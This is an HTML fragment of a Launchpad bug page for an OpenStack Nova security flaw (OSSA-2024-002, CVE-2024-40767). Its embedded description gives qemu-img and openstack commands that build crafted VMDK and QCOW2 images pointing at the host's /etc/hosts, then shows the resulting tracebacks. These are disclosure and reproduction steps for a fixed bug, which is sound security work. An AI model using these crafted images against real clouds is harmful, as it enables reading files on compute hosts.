      <div class="portlet vertical" id="portlet-subscribers">
  <h2>Other bug subscribers</h2>
  <div>
    <div><a class="menu-link-addsubscriber sprite add" href="https://bugs.launchpad.net/nova/+bug/2071734/+addsubscriber" title="Launchpad will email that person whenever this bugs changes">Subscribe someone else</a></div>
  </div>
  <div id="other-bug-subscribers"></div>
</div>

      

      

      
  <div class="portlet" id="portlet-patches">
    <h2>Patches</h2>
    <ul>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2071734/+attachment/5794695/+files/unforce-format.patch" class="sprite haspatch-icon">unforce-format.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2071734/+attachment/5794695">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2071734/+attachment/5795886/+files/master.patch" class="sprite haspatch-icon">master.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2071734/+attachment/5795886">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2071734/+attachment/5795888/+files/2024.1.patch" class="sprite haspatch-icon">2024.1.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2071734/+attachment/5795888">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2071734/+attachment/5795914/+files/2023.1.patch" class="sprite haspatch-icon">2023.1.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2071734/+attachment/5795914">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2071734/+attachment/5795915/+files/2023.2.patch" class="sprite haspatch-icon">2023.2.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2071734/+attachment/5795915">Edit</a>
      </li>
    </ul>
    <ul>
      <li>
        <a class="sprite add" href="/nova/+bug/2071734/+addcomment?field.patch=on">Add patch</a>
      </li>
    </ul>
  </div>
  


      <div class="portlet" id="portlet-watches">
  <h2>Remote bug watches</h2>
  <ul>
  </ul>
  <p>Bug watches keep track of this bug in other bug trackers.</p>
</div>

    
          </div><!-- yui-b side -->
        
      </div><!-- yui-t4 -->

      
  <div id="footer" class="footer">
    <div class="lp-arcana">
        <div class="lp-branding">
          <a href="https://launchpad.net/"><img src="/@@/launchpad-footer-logo.svg" alt="Launchpad" width="65" height="18" /></a>
          &nbsp;&bull;&nbsp;
          <a href="https://launchpad.net/+tour">Take the tour</a>
          &nbsp;&bull;&nbsp;
          <a href="https://help.launchpad.net/">Read the guide</a>
          &nbsp;
          <form id="globalsearch" method="get" accept-charset="UTF-8" action="https://launchpad.net/+search">
            <input type="search" id="search-text" name="field.text" />
            <input type="image" src="/@@/search" style="vertical-align:5%" alt="Search Launchpad" />
          </form>
        </div>
        
  

    </div>

    <div class="colophon">
      &copy; 2004
      <a href="http://canonical.com/">Canonical&nbsp;Ltd.</a>
      &nbsp;&bull;&nbsp;
      <a href="https://launchpad.net/legal">Terms of use</a>
      &nbsp;&bull;&nbsp;
      <a href="https://www.ubuntu.com/legal/dataprivacy">Data privacy</a>
      &nbsp;&bull;&nbsp;
      <a href="/feedback">Contact Launchpad Support</a>
      
      &nbsp;&bull;&nbsp;
      <a href="http://blog.launchpad.net/">Blog</a>
      
	&nbsp;&bull;&nbsp;
	<a href="https://canonical.com/careers">Careers</a>
      
      &nbsp;&bull;&nbsp;
      <a href="https://ubuntu.social/@launchpadstatus">System status</a>
      <span id="lp-version">
      &nbsp;&bull;&nbsp;
        6394e03
        
        
        (<a href="https://dev.launchpad.net/">Get the code!</a>)
      </span>
    </div>
  </div>

    </div><!-- yui-d0-->

    
  
  
  <script id="json-cache-script">LP.cache = {"related_features": {}, "bug": {"self_link": "https://bugs.launchpad.net/api/devel/bugs/2071734", "web_link": "https://bugs.launchpad.net/bugs/2071734", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug", "id": 2071734, "private": false, "information_type": "Public Security", "name": null, "title": "[OSSA-2024-002] Incomplete file access fix and regression for QCOW2 backing files and VMDK flat descriptors (CVE-2024-40767)", "description": "When fixing bug #2059809, a regression of the previous bug #1996188 has been introduced.\n\nTLDR: nova is allowing back VMDK with wrong types and QCOW with backing files.\n\nLong:\n\nThe following steps were used to reproduce on a Bobcat (2023.2) OpenStack + nova patches for bug #2059809 (not yet merge when writing this report)\n\nCreate a vmdk file:\n$ qemu-img create -f vmdk disk-vmdk.vmdk 1M -o subformat=monolithicFlat\n$ sed -i -r 's|disk-vmdk-flat.vmdk|/etc/hosts|' disk-vmdk.vmdk\n\nCreate a faulty qcow image:\n$ qemu-img create -f qcow2 -F raw -b /etc/hosts disk-bf.qcow2 1M\n\nUpload both images as raw (the default)\n$ for i in disk-bf.qcow2 disk-vmdk.vmdk ; do openstack image create --file $i $i ; done\n\nBoot an instance from those images:\n$ openstack server create --flavor small --image disk-vmdk.vmdk --net public disk-vmdk.vmdk\n$ openstack server create --flavor small --image disk-bf.qcow2 --net public disk-bf.qcow2\n\nResults\n=======\nVMDK monolithicFlat\n-------------------\n\nTraceback (most recent call last):\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/nova/compute/manager.py\", line 2615, in _build_and_run_instance\n\u00a0\u00a0\u00a0\u00a0self.driver.spawn(context, instance, image_meta,\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/nova/virt/libvirt/driver.py\", line 4388, in spawn\n\u00a0\u00a0\u00a0\u00a0created_instance_dir, created_disks = self._create_image(\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0^^^^^^^^^^^^^^^^^^^\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/nova/virt/libvirt/driver.py\", line 4790, in _create_image\n\u00a0\u00a0\u00a0\u00a0created_disks = self._create_and_inject_local_root(\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/nova/virt/libvirt/driver.py\", line 4921, in _create_and_inject_local_root\n\u00a0\u00a0\u00a0\u00a0self._try_fetch_image_cache(backend, fetch_func, context,\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/nova/virt/libvirt/driver.py\", line 10940, in _try_fetch_image_cache\n\u00a0\u00a0\u00a0\u00a0image.cache(fetch_func=fetch_func,\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/nova/virt/libvirt/imagebackend.py\", line 288, in cache\n\u00a0\u00a0\u00a0\u00a0self.create_image(fetch_func_sync, base, size,\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/nova/virt/libvirt/imagebackend.py\", line 615, in create_image\n\u00a0\u00a0\u00a0\u00a0copy_raw_image(base, self.path, size)\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/oslo_concurrency/lockutils.py\", line 414, in inner\n\u00a0\u00a0\u00a0\u00a0return f(*args, **kwargs)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0^^^^^^^^^^^^^^^^^^\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/nova/virt/libvirt/imagebackend.py\", line 590, in copy_raw_image\n\u00a0\u00a0\u00a0\u00a0self.resize_image(size)\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/nova/virt/libvirt/imagebackend.py\", line 621, in resize_image\n\u00a0\u00a0\u00a0\u00a0disk.extend(image, size)\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/nova/virt/disk/api.py\", line 128, in extend\n\u00a0\u00a0\u00a0\u00a0processutils.execute('qemu-img', 'resize', image.path, size)\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/oslo_concurrency/processutils.py\", line 438, in execute\n\u00a0\u00a0\u00a0\u00a0raise ProcessExecutionError(exit_code=_returncode,\noslo_concurrency.processutils.ProcessExecutionError: Unexpected error while running command.\nCommand: qemu-img resize /var/lib/nova/instances/07b5907b-5efc-4fdf-8b15-4b47a820c2f8/disk 2147483648\nExit code: 1\nStdout: ''\nStderr: \"qemu-img: Could not open '/var/lib/nova/instances/07b5907b-5efc-4fdf-8b15-4b47a820c2f8/disk': Could not open '/etc/hosts': Permission denied\\n\"\n\nQemu tried to read /etc/hosts. My system permissions prevented it, but nova did nothing about it: wrong.\n\nQEMU Backing File\n-----------------\nTraceback (most recent call last):\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/nova/compute/manager.py\", line 2615, in _build_and_run_instance\n\u00a0\u00a0\u00a0\u00a0self.driver.spawn(context, instance, image_meta,\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/nova/virt/libvirt/driver.py\", line 4415, in spawn\n\u00a0\u00a0\u00a0\u00a0self._create_guest_with_network(\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/nova/virt/libvirt/driver.py\", line 7785, in _create_guest_with_network\n\u00a0\u00a0\u00a0\u00a0with excutils.save_and_reraise_exception():\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/oslo_utils/excutils.py\", line 227, in __exit__\n\u00a0\u00a0\u00a0\u00a0self.force_reraise()\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/oslo_utils/excutils.py\", line 200, in force_reraise\n\u00a0\u00a0\u00a0\u00a0raise self.value\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/nova/virt/libvirt/driver.py\", line 7763, in _create_guest_with_network\n\u00a0\u00a0\u00a0\u00a0guest = self._create_guest(\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0^^^^^^^^^^^^^^^^^^^\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/nova/virt/libvirt/driver.py\", line 7702, in _create_guest\n\u00a0\u00a0\u00a0\u00a0guest.launch(pause=pause)\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/nova/virt/libvirt/guest.py\", line 167, in launch\n\u00a0\u00a0\u00a0\u00a0with excutils.save_and_reraise_exception():\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/oslo_utils/excutils.py\", line 227, in __exit__\n\u00a0\u00a0\u00a0\u00a0self.force_reraise()\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/oslo_utils/excutils.py\", line 200, in force_reraise\n\u00a0\u00a0\u00a0\u00a0raise self.value\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/nova/virt/libvirt/guest.py\", line 165, in launch\n\u00a0\u00a0\u00a0\u00a0return self._domain.createWithFlags(flags)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/eventlet/tpool.py\", line 193, in doit\n\u00a0\u00a0\u00a0\u00a0result = proxy_call(self._autowrap, f, *args, **kwargs)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/eventlet/tpool.py\", line 151, in proxy_call\n\u00a0\u00a0\u00a0\u00a0rv = execute(f, *args, **kwargs)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/eventlet/tpool.py\", line 132, in execute\n\u00a0\u00a0\u00a0\u00a0six.reraise(c, e, tb)\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/six.py\", line 719, in reraise\n\u00a0\u00a0\u00a0\u00a0raise value\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/eventlet/tpool.py\", line 86, in tworker\n\u00a0\u00a0\u00a0\u00a0rv = meth(*args, **kwargs)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0^^^^^^^^^^^^^^^^^^^^^\n\u00a0\u00a0File \"/usr/lib/python3/dist-packages/libvirt.py\", line 1409, in createWithFlags\n\u00a0\u00a0\u00a0\u00a0raise libvirtError('virDomainCreateWithFlags() failed')\nlibvirt.libvirtError: internal error: cannot update AppArmor profile 'libvirt-6bd32822-2454-402a-9617-6ec66e0090f4'\n\nIn libvirtd journalctl:\n\nJul 02 20:22:44 compute-1 libvirtd[959438]: internal error: Child process (LIBVIRT_LOG_OUTPUTS=3:stderr /usr/lib/libvirt/virt-aa-helper -r -u libvirt-6bd32822-2454-402a-9617-6ec66e0090f4 -F /dev/net/tun) unexpected exit status 1: virt-aa-helper: error: /etc/hosts\n\nHere it's apparmor that prevented the boot, but nova should have catched it: wrong\n\nExpected results\n----------------\n\nNova should raise an exception like it does previously.\nE.G. for VMDK: nova.exception.ImageUnacceptable: Image xyz is unacceptable: Invalid VMDK create-type specified", "owner_link": "https://bugs.launchpad.net/api/devel/~arnaud-morin", "bug_tasks_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2071734/bug_tasks", "duplicate_of_link": null, "date_created": "2024-07-02T20:43:08.365346+00:00", "activity_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2071734/activity", "subscriptions_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2071734/subscriptions", "date_last_updated": "2024-09-20T08:14:34.717468+00:00", "who_made_private_link": null, "date_made_private": null, "heat": 282, "bug_watches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2071734/bug_watches", "cves_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2071734/cves", "vulnerabilities_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2071734/vulnerabilities", "duplicates_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2071734/duplicates", "attachments_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2071734/attachments", "security_related": true, "latest_patch_uploaded": "2024-07-10T16:07:55.393670+00:00", "tags": ["in-unmaintained-yoga", "in-unmaintained-zed"], "date_last_message": "2024-09-20T08:14:33.567315+00:00", "number_of_duplicates": 0, "message_count": 111, "users_affected_count": 1, "users_unaffected_count": 0, "users_affected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2071734/users_affected", "users_unaffected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2071734/users_unaffected", "users_affected_count_with_dupes": 1, "other_users_affected_count_with_dupes": 1, "users_affected_with_dupes_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2071734/users_affected_with_dupes", "messages_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2071734/messages", "lock_status": "Unlocked", "lock_reason": null, "linked_branches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2071734/linked_branches", "linked_merge_proposals_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2071734/linked_merge_proposals", "http_etag": "\"3887b6bb282dd11152a28d068d6fc9572a1de0e2-a286ae03e17b5d797add7b66f716704e75759a57\""}, "subscribers_portlet_url_data": {"web_link": "https://bugs.launchpad.net/bugs/2071734", "self_link": "https://bugs.launchpad.net/api/devel/bugs/2071734"}, "total_comments_and_activity": 163, "initial_comment_batch_offset": 41, "first visible_recent_comment": 70, "bugtask_data": {"3217143": {"id": 3217143, "row_id": "tasksummary3217143", "form_row_id": "task3217143", "bugtask_path": "/nova/+bug/2071734", "prefix": "nova", "targetname": "OpenStack Compute (nova)", "bug_title": "[OSSA-2024-002] Incomplete file access fix and regression for QCOW2 backing files and VMDK flat descriptors (CVE-2024-40767)", "assignee_value": null, "assignee_is_team": null, "assignee_vocabulary": "AllUserTeamsParticipation", "assignee_vocabulary_filters": [], "hide_assignee_team_selection": true, "user_can_unassign": false, "user_can_delete": false, "delete_link": "https://bugs.launchpad.net/nova/+bug/2071734/+delete", "target_is_product": true, "status_widget_items": [{"name": "Fix Released", "value": "Fix Released", "description": "The fix was released.\n", "description_css_class": "choice-description", "style": "", "help": "", "disabled": false, "css_class": "statusFIXRELEASED"}], "status_value": "Fix Released", "importance_widget_items": "[]", "importance_value": "Critical", "milestone_widget_items": "[]", "milestone_value": null, "user_can_edit_assignee": false, "user_can_edit_milestone": false, "user_can_edit_status": false, "user_can_edit_importance": false}, "3217144": {"id": 3217144, "row_id": "tasksummary3217144", "form_row_id": "task3217144", "bugtask_path": "/ossa/+bug/2071734", "prefix": "ossa", "targetname": "OpenStack Security Advisory", "bug_title": "[OSSA-2024-002] Incomplete file access fix and regression for QCOW2 backing files and VMDK flat descriptors (CVE-2024-40767)", "assignee_value": "fungi", "assignee_is_team": false, "assignee_vocabulary": "AllUserTeamsParticipation", "assignee_vocabulary_filters": [], "hide_assignee_team_selection": true, "user_can_unassign": false, "user_can_delete": false, "delete_link": "https://bugs.launchpad.net/ossa/+bug/2071734/+delete", "target_is_product": true, "status_widget_items": [{"name": "Fix Released", "value": "Fix Released", "description": "The fix was released.\n", "description_css_class": "choice-description", "style": "", "help": "", "disabled": false, "css_class": "statusFIXRELEASED"}], "status_value": "Fix Released", "importance_widget_items": "[]", "importance_value": "High", "milestone_widget_items": "[]", "milestone_value": null, "user_can_edit_assignee": false, "user_can_edit_milestone": false, "user_can_edit_status": false, "user_can_edit_importance": false}}, "information_type_data": {"PUBLIC": {"value": "PUBLIC", "description": "Everyone can see this information.\n", "name": "Public", "order": 0, "is_private": false, "description_css_class": "choice-description"}, "PUBLICSECURITY": {"value": "PUBLICSECURITY", "description": "Everyone can see this security related information.\n", "name": "Public Security", "order": 1, "is_private": false, "description_css_class": "choice-description"}, "PRIVATESECURITY": {"value": "PRIVATESECURITY", "description": "Only the security group can see this information.\n ", "name": "Private Security", "order": 2, "is_private": true, "description_css_class": "choice-description"}, "USERDATA": {"value": "USERDATA", "description": "Only shared with users permitted to see private user information.\n", "name": "Private", "order": 3, "is_private": true, "description_css_class": "choice-description"}}, "bug_is_private": false, "context": {"self_link": "https://bugs.launchpad.net/api/devel/nova/+bug/2071734", "web_link": "https://bugs.launchpad.net/nova/+bug/2071734", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug_task", "bug_link": "https://bugs.launchpad.net/api/devel/bugs/2071734", "milestone_link": null, "status": "Fix Released", "status_explanation": null, "importance": "Critical", "importance_explanation": null, "assignee_link": null, "bug_target_display_name": "OpenStack Compute (nova)", "bug_target_name": "nova", "bug_watch_link": null, "date_assigned": null, "date_created": "2024-07-02T20:43:08.365346+00:00", "date_confirmed": "2024-07-02T20:49:40.171267+00:00", "date_incomplete": null, "date_in_progress": "2024-07-23T14:01:12.733225+00:00", "date_closed": "2024-07-23T23:40:04.286390+00:00", "date_left_new": "2024-07-02T20:49:40.171267+00:00", "date_triaged": "2024-07-23T14:01:12.733225+00:00", "date_fix_committed": "2024-07-23T23:40:04.286390+00:00", "date_fix_released": "2024-07-23T23:40:04.286390+00:00", "date_left_closed": null, "owner_link": "https://bugs.launchpad.net/api/devel/~arnaud-morin", "target_link": "https://bugs.launchpad.net/api/devel/nova", "title": "Bug #2071734 in OpenStack Compute (nova): \"[OSSA-2024-002] Incomplete file access fix and regression for QCOW2 backing files and VMDK flat descriptors (CVE-2024-40767)\"", "related_tasks_collection_link": "https://bugs.launchpad.net/api/devel/nova/+bug/2071734/related_tasks", "is_complete": true, "http_etag": "\"4b1ab67269efec19e196223f02b15a3d77a5cb8b-336df369dd578d2dd37f78df958d5c080aada904\""}};</script>

    
  

    
  </body>


  <!--
    Facet name: bugs
    Page type: main_side
    Has global search: True
    Has application tabs: True
    Has side portlets: True

    At least 49 queries/external actions issued in 0.77 seconds

    Features: {'profiling.enabled': None, 'hard_timeout': '9000', 'app.mainsite_only.canonical_url': None, 'js.yui_version': None, 'app.maintenance_message': None, 'bugs.affected_count_includes_dupes.disabled': None, 'baselayout.careers_link.disabled': None, 'visible_render_time': None}

    r6394e03

    -->

</html>

